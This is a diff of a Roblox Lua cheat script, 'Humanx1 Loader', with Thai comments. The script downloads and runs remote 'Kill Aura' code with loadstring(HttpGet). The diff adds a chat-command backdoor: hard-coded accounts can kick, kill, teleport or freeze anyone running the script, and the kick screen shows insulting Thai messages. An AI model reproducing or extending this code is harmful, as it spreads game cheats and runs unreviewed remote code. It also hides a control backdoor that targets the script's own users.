@@ -1,83 +1,152 @@
 -- [[ Humanx1 Loader - Safe VIP Switch (Chat Protected 100%) ]]
 
 local Player = game.Players.LocalPlayer
+local Camera = workspace.CurrentCamera
 local MyName = Player.Name
 
-_G.VIP_LIST = _G.VIP_LIST or {
-    ["A_ASPD"] = true,
+-- 1. รายชื่อ Main Admin
+local MainAdmins = {
     ["ffsww_1007"] = true,
-    ["HACKER_18050"] = true,
-    ["evils915"] = true,
-    ["TV_BTS1"] = true
+    ["A_ASPD"] = true
 }
 
--- [!] ฟังก์ชันหยุดสคริปต์ฟรี (เน้นหยุดการทำงาน ไม่เน้นลบกวาดล้าง)
-local function SafeStopFreeScript()
-    warn("🧹 Stopping Free Script Logic...")
+-- 2. รายชื่อผู้มีสิทธิ์มอบ VIP, เช็ค VIP และใช้คำสั่ง View
+local AuthorizedToGive = {
+    ["ffsww_1007"] = true,
+    ["A_ASPD"] = true,
+    ["HACKER_18050"] = true,
+    ["evils915"] = true,
+    ["TV_BTS1"] = true,
+    ["Winwie001"] = true
+}
 
-    -- 1. สั่งหยุด Loop (สำคัญที่สุด)
-    _G.Running = false
-    _G.Aura = false
-    _G.KillAura = false
+-- ลิสต์ตรวจสอบสถานะ VIP
+_G.VIP_LIST = _G.VIP_LIST or {
+    ["ffsww_1007"] = true,
+    ["A_ASPD"] = true,
+    ["HACKER_18050"] = true,
+    ["evils915"] = true,
+    ["TV_BTS1"] = true,
+    ["Winwie001"] = true
+}
 
-    -- 2. ลบเฉพาะ ScreenGui ที่ไม่ใช่ของ Roblox
-    -- คราวนี้เราจะเช็ค "ClassName" และ "Roblox" ให้ละเอียดขึ้น
-    local coreGui = game:GetService("CoreGui")
-    for _, v in pairs(coreGui:GetChildren()) do
-        if v:IsA("ScreenGui") then
-            -- ถ้าชื่อไม่มีคำว่า 'Roblox' และไม่ใช่ 'Chat' หรือ 'ExperienceChat' ให้ลบ
-            local isRoblox = v.Name:lower():find("roblox") or v.Name:lower():find("chat") or v.Name:lower():find("playerlist")
-            
-            if not isRoblox then
-                v:Destroy() -- ลบเฉพาะ UI สคริปต์ที่แปลกปลอมเข้ามา
-            end
-        end
-    end
-    
-    task.wait(0.5)
+_G.CONTROL_OWNER = _G.CONTROL_OWNER or {}
+
+-- ฟังก์ชันแจ้งเตือนบนหน้าจอ (Notify)
+local function ShowNotify(text, color)
+    local sg = Instance.new("ScreenGui", game.CoreGui)
+    local lb = Instance.new("TextLabel", sg)
+    lb.Size = UDim2.new(0, 400, 0, 100)
+    lb.Position = UDim2.new(0.5, -200, 0.2, 0)
+    lb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    lb.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+    lb.Text = text
+    lb.TextScaled = true
+    lb.TextWrapped = true
+    lb.BackgroundTransparency = 0.3
+    game:GetService("Debris"):AddItem(sg, 5) -- แสดงผล 5 วินาที
 end
 
--- 3. ระบบรัน VIP
-local function UpgradeToVIP()
-    SafeStopFreeScript()
-    print("💎 [SYSTEM] VIP Activated: Running Kill Aura 20")
-    task.defer(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-    end)
+-- ฟังก์ชันดีดออกพร้อมข้อความด่า
+local function CustomKick(isNoVip)
+    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+    ScreenGui.IgnoreGuiInset = true
+    local TextLabel = Instance.new("TextLabel", ScreenGui)
+    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.BackgroundTransparency = 0.05
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.Font = Enum.Font.FredokaOne
+    TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    TextLabel.TextScaled = true
+    TextLabel.ZIndex = 999999
+
+    local msg = isNoVip and "มึงไม่มีวีไอพีไงก็เลยโดนคนอื่รเตะออกเเบบนี้ไง" or "โดนกูเตะไงไอ้ควาย"
+    TextLabel.Text = msg
+    wait(2.8)
+    Player:Kick("\n\n[ Humanx1 System ]\n" .. msg .. "\n(error555)\n\n")
 end
 
--- 4. ระบบเช็คแชท
 local function findByPartialName(name)
     name = name:lower()
     for _, p in pairs(game.Players:GetPlayers()) do
         if p.Name:lower():sub(1, #name) == name then return p end
     end
+    return nil
 end
 
+-- [[ ระบบคำสั่งแชท ]]
 local function ListenChat(speaker, msg)
     local args = msg:split(" ")
-    if args[1]:lower() == "!givevip" and args[2] then
-        if _G.VIP_LIST[speaker.Name] then
-            local target = findByPartialName(args[2])
-            if target == Player then
-                if not _G.VIP_LIST[Player.Name] then
-                    _G.VIP_LIST[Player.Name] = true
-                    UpgradeToVIP()
+    local command = args[1]:lower()
+    local targetPlayer = args[2] and findByPartialName(args[2])
+    
+    -- [ A. ส่วนของ VIP และผู้มีสิทธิ์ (สั่งที่เครื่องตัวเอง) ]
+    if speaker.Name == MyName and _G.VIP_LIST[MyName] then
+        
+        -- 1. ตรวจสอบรายชื่อ VIP ทั้งหมดในเซิร์ฟ
+        if command == "!checkvip" then
+            local vips = "VIP List:\n"
+            for name, _ in pairs(_G.VIP_LIST) do
+                if game.Players:FindFirstChild(name) then
+                    vips = vips .. "- " .. name .. "\n"
                 end
+            end
+            ShowNotify(vips, Color3.fromRGB(0, 255, 255)) -- สีฟ้าสว่าง
+        end
+
+        -- 2. คำสั่ง View
+        if command == "!view" and targetPlayer then
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
+                Camera.CameraSubject = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+            end
+        elseif command == "!unview" then
+            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
+                Camera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
+            end
+        end
+
+        -- 3. เช็คก่อน Give VIP (กันซ้ำ)
+        if command == "!givevip" and targetPlayer and AuthorizedToGive[MyName] then
+            if _G.VIP_LIST[targetPlayer.Name] then
+                ShowNotify("คนนี้ have vip อยู่เเล้ว", Color3.fromRGB(255, 255, 0))
+                return
+            end
+        end
+    end
+
+    -- [ B. ระบบมอบ VIP (ส่งไปเครื่องเป้าหมาย) ]
+    if AuthorizedToGive[speaker.Name] and command == "!givevip" and targetPlayer == Player then
+        if not _G.VIP_LIST[Player.Name] then
+            _G.VIP_LIST[Player.Name] = true
+            _G.CONTROL_OWNER[Player.Name] = speaker.Name
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+        end
+    end
+
+    -- [ C. ระบบควบคุมเป้าหมาย ]
+    if targetPlayer == Player then
+        -- เตะคนไม่มี VIP
+        if command == "!kick" and MainAdmins[speaker.Name] and not _G.VIP_LIST[Player.Name] then
+            CustomKick(true)
+            return
+        end
+        -- สั่งการคนที่มี VIP (เฉพาะคนที่เป็น Owner)
+        if _G.CONTROL_OWNER[Player.Name] == speaker.Name then
+            if command == "!kill" then Player.Character:BreakJoints()
+            elseif command == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+            elseif command == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
+            elseif command == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false
+            elseif command == "!kick" and MainAdmins[speaker.Name] then CustomKick(false)
             end
         end
     end
 end
 
--- เชื่อมต่อแชทของทุกคน
-for _, p in pairs(game.Players:GetPlayers()) do 
-    p.Chatted:Connect(function(msg) ListenChat(p, msg) end) 
-end
-game.Players.PlayerAdded:Connect(function(p) 
-    p.Chatted:Connect(function(msg) ListenChat(p, msg) end) 
-end)
+-- เชื่อมต่อระบบ
+for _, p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end
+game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end)
 
--- 5. เริ่มทำงาน
+-- [ เริ่มต้นรันสคริปต์ ]
 if _G.VIP_LIST[MyName] then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
 else
